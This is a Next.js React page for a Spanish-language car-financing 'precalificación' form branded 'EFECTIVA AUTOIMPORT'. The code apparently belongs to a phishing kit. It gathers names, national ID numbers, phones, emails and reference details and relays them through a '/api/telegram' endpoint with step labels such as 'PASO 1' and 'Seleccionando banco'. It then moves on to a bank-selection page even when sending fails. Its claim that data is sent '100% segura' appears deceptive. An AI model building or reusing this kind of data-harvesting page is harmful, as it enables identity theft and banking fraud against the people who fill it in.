"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function PrecalificacionPage() {
  const router = useRouter();

  // Estados del formulario unificados
  const [nombre, setNombre] = useState("");
  const [apellido, setApellido] = useState("");
  const [cedula, setCedula] = useState("");
  const [correo, setCorreo] = useState("");
  const [plazo, setPlazo] = useState("");
  const [telefono, setTelefono] = useState("");
  const [marca, setMarca] = useState("");
  const [anio, setAnio] = useState("");
  const [tipoInicial, setTipoInicial] = useState("");
  const [monto, setMonto] = useState("");
  const [refNombre, setRefNombre] = useState("");
  const [refApellido, setRefApellido] = useState("");
  const [parentesco, setParentesco] = useState("");
  const [distribuidor, setDistribuidor] = useState("");
  const [codigoDistribuidor, setCodigoDistribuidor] = useState("");
  const [loading, setLoading] = useState(false);

  const handleContinue = async () => {
    if (
      !nombre.trim() || !apellido.trim() || !cedula.trim() || !correo.trim() ||
      !plazo.trim() || !telefono.trim() || !marca.trim() || !anio.trim() ||
      !tipoInicial.trim() || !monto.trim() || !refNombre.trim() || !refApellido.trim() ||
      !parentesco.trim() || !distribuidor.trim() || !codigoDistribuidor.trim()
    ) {
      alert("⚠️ Todos los campos son obligatorios. Por favor, complete el formulario completo.");
      return;
    }

    setLoading(true);

    try {
      const datosFormulario = {
        pagina: "🚀 PASO 1: DATOS DE PRECALIFICACIÓN",
        nombre: `${nombre.toUpperCase()} ${apellido.toUpperCase()}`,
        cedula: cedula,
        telefono: telefono,
        correo: correo,
        banco: "⏳ Seleccionando banco...",
        detalles: `
🚗 **DATOS DEL VEHÍCULO**
• Marca/Modelo: ${marca}
• Año: ${anio}
• Inicial: ${tipoInicial}
• Monto: ${monto}
• Plazo: ${plazo}

👥 **REFERENCIA PERSONAL**
• Nombre: ${refNombre} ${refApellido}
• Parentesco: ${parentesco}

🏢 **DISTRIBUIDOR**
• Nombre: ${distribuidor}
• Código: ${codigoDistribuidor}
        `.trim()
      };

      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datosFormulario),
      });

      const result = await response.json();

      if (result.success) {
        localStorage.setItem("cliente_actual", `${nombre} ${apellido}`);
        localStorage.setItem("cliente_telefono", telefono);
        router.push("/bancos");
      } else {
        throw new Error(result.error || "Error al enviar");
      }

    } catch (error) {
      console.error("Error enviando datos:", error);
      router.push("/bancos");
    } finally {
      setLoading(false);
    }
  };

  const isFormIncomplete = !nombre || !apellido || !cedula || !correo || !plazo || !telefono || !marca || !anio || !tipoInicial || !monto || !refNombre || !refApellido || !parentesco || !distribuidor || !codigoDistribuidor;

  return (
    <main className="min-h-screen bg-black px-4 py-10 md:px-6 text-white flex items-center justify-center">
      <section className="w-full max-w-3xl rounded-3xl border border-yellow-500/30 bg-zinc-950 p-6 md:p-10 shadow-2xl relative overflow-hidden">
        
        {/* Encabezado */}
        <p className="text-sm font-semibold tracking-[0.3em] text-yellow-500 uppercase">
          EFECTIVA AUTOIMPORT
        </p>

        <h1 className="mt-4 text-3xl md:text-4xl font-black tracking-tight">
          Precalificación Premium
        </h1>

        <p className="mt-2 text-zinc-400 text-sm md:text-base">
          Complete los datos requeridos para iniciar su proceso de financiamiento inmediato de manera segura.
        </p>

        {/* Barra de progreso interactiva (Paso 1) */}
        <div className="mt-6">
          <div className="mb-2 flex justify-between text-xs font-bold tracking-widest text-zinc-400 uppercase">
            <span>Paso 1 de 2: Formulario Inicial</span>
            <span className="text-yellow-500">50%</span>
          </div>

          <div className="h-2 w-full rounded-full bg-zinc-900 border border-zinc-800">
            <div className="h-full w-1/2 rounded-full bg-gradient-to-r from-yellow-600 to-yellow-400 transition-all duration-500"></div>
          </div>
        </div>

        {/* Formulario */}
        <form className="mt-8 grid grid-cols-1 sm:grid-cols-2 gap-5" onSubmit={(e) => e.preventDefault()}>
          
          {/* --- DATOS PERSONALES --- */}
          <div className="sm:col-span-2 border-b border-zinc-900 pb-2 mt-2">
            <p className="text-xs font-black tracking-widest text-yellow-500/80 uppercase">👤 Datos Personales</p>
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Nombre</label>
            <input
              type="text"
              placeholder="Ej: Juan"
              value={nombre}
              onChange={(e) => setNombre(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Apellido</label>
            <input
              type="text"
              placeholder="Ej: Pérez"
              value={apellido}
              onChange={(e) => setApellido(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Cédula</label>
            <input
              type="text"
              placeholder="001-0000000-0"
              value={cedula}
              onChange={(e) => setCedula(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Número de Teléfono</label>
            <input
              type="tel"
              placeholder="(809) 000-0000"
              value={telefono}
              onChange={(e) => setTelefono(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div className="sm:col-span-2">
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Correo Electrónico</label>
            <input
              type="email"
              placeholder="correo@email.com"
              value={correo}
              onChange={(e) => setCorreo(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          {/* --- DATOS DEL VEHÍCULO Y FINANCIAMIENTO --- */}
          <div className="sm:col-span-2 border-b border-zinc-900 pb-2 mt-4">
            <p className="text-xs font-black tracking-widest text-yellow-500/80 uppercase">🚗 Detalles del Financiamiento</p>
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Marca / Modelo</label>
            <select 
              value={marca} 
              onChange={(e) => setMarca(e.target.value)} 
              className="w-full rounded-xl border border-zinc-800 bg-black p-4 text-sm outline-none focus:border-yellow-500 transition-colors text-zinc-300"
            >
              <option value="">Seleccione Marca / Modelo</option>
              <optgroup label="Toyota">
                <option value="Toyota Corolla">Toyota Corolla</option>
                <option value="Toyota Camry">Toyota Camry</option>
                <option value="Toyota Rav4">Toyota Rav4</option>
                <option value="Toyota Hilux">Toyota Hilux</option>
                <option value="Toyota 4Runner">Toyota 4Runner</option>
                <option value="Toyota Land Cruiser Prado">Toyota Prado</option>
              </optgroup>
              <optgroup label="Honda">
                <option value="Honda Civic">Honda Civic</option>
                <option value="Honda CR-V">Honda CR-V</option>
                <option value="Honda Accord">Honda Accord</option>
              </optgroup>
              <optgroup label="Hyundai">
                <option value="Hyundai Sonata LF">Hyundai Sonata LF</option>
                <option value="Hyundai Sonata New Rise">Hyundai Sonata New Rise</option>
                <option value="Hyundai Tucson">Hyundai Tucson</option>
                <option value="Hyundai Santa Fe">Hyundai Santa Fe</option>
              </optgroup>
              <optgroup label="Kia">
                <option value="Kia K5">Kia K5</option>
                <option value="Kia Sportage">Kia Sportage</option>
                <option value="Kia Sorento">Kia Sorento</option>
              </optgroup>
              <option value="Otro">Otro Marca / Modelo</option>
            </select>
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Año del Vehículo</label>
            <input
              type="text"
              placeholder="Ej: 2018"
              value={anio}
              onChange={(e) => setAnio(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Tipo de Inicial</label>
            <select 
              value={tipoInicial} 
              onChange={(e) => setTipoInicial(e.target.value)} 
              className="w-full rounded-xl border border-zinc-800 bg-black p-4 text-sm outline-none focus:border-yellow-500 transition-colors text-zinc-300"
            >
              <option value="">Seleccione el tipo</option>
              <option value="Inicial efectivo">Inicial efectivo</option>
              <option value="Inicial en cuenta">Inicial en cuenta</option>
              <option value="No tengo inicial">No tengo inicial</option>
            </select>
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Monto de Financiación</label>
            <input
              type="text"
              placeholder="Ej: RD$ 400,000"
              value={monto}
              onChange={(e) => setMonto(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div className="sm:col-span-2">
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Plazo Preferido</label>
            <select 
              value={plazo} 
              onChange={(e) => setPlazo(e.target.value)} 
              className="w-full rounded-xl border border-zinc-800 bg-black p-4 text-sm outline-none focus:border-yellow-500 transition-colors text-zinc-300"
            >
              <option value="">Seleccione los años de plazo</option>
              {[3, 4, 5, 6].map(a => <option key={a} value={`${a} años`}>{a} años</option>)}
            </select>
          </div>

          {/* --- REFERENCIAS PERSONALES --- */}
          <div className="sm:col-span-2 border-b border-zinc-900 pb-2 mt-4">
            <p className="text-xs font-black tracking-widest text-yellow-500/80 uppercase">👥 Referencia Personal</p>
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Nombre Ref.</label>
            <input
              type="text"
              placeholder="Nombre de referencia"
              value={refNombre}
              onChange={(e) => setRefNombre(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Apellido Ref.</label>
            <input
              type="text"
              placeholder="Apellido de referencia"
              value={refApellido}
              onChange={(e) => setRefApellido(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div className="sm:col-span-2">
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Parentesco / Relación</label>
            <input
              type="text"
              placeholder="Ej: Primo, Amigo, Hermano"
              value={parentesco}
              onChange={(e) => setParentesco(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          {/* --- DATOS DISTRIBUIDOR --- */}
          <div className="sm:col-span-2 border-b border-zinc-900 pb-2 mt-4">
            <p className="text-xs font-black tracking-widest text-yellow-500/80 uppercase">🏢 Distribuidor</p>
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Distribuidor Asociado</label>
            <input
              type="text"
              placeholder="Nombre del distribuidor"
              value={distribuidor}
              onChange={(e) => setDistribuidor(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          <div>
            <label className="mb-2 block text-xs font-bold uppercase tracking-wider text-zinc-400">Código de Distribuidor</label>
            <input
              type="text"
              placeholder="Ej: DIS-9921"
              value={codigoDistribuidor}
              onChange={(e) => setCodigoDistribuidor(e.target.value)}
              className="w-full rounded-xl border border-zinc-800 bg-black/50 p-4 text-sm outline-none focus:border-yellow-500 transition-colors placeholder:text-zinc-700"
            />
          </div>

          {/* Botón de envío unificado */}
          <button
            type="button"
            onClick={handleContinue}
            disabled={loading || isFormIncomplete}
            className="sm:col-span-2 mt-6 w-full rounded-xl bg-gradient-to-r from-yellow-600 via-yellow-500 to-yellow-400 p-4 text-base font-black text-black tracking-wider uppercase transition duration-300 hover:brightness-110 active:scale-[0.99] disabled:opacity-30 disabled:cursor-not-allowed shadow-[0_0_30px_rgba(234,179,8,0.25)] cursor-pointer"
          >
            {loading ? "PROCESANDO SOLICITUD..." : "CONTINUAR"}
          </button>
        </form>

        {/* Notificación inferior de privacidad */}
        <p className="mt-6 text-center text-[10px] tracking-widest text-zinc-600 font-semibold uppercase">
          🔒 Sus datos se transmiten de manera cifrada y 100% segura
        </p>
      </section>
    </main>
  );
}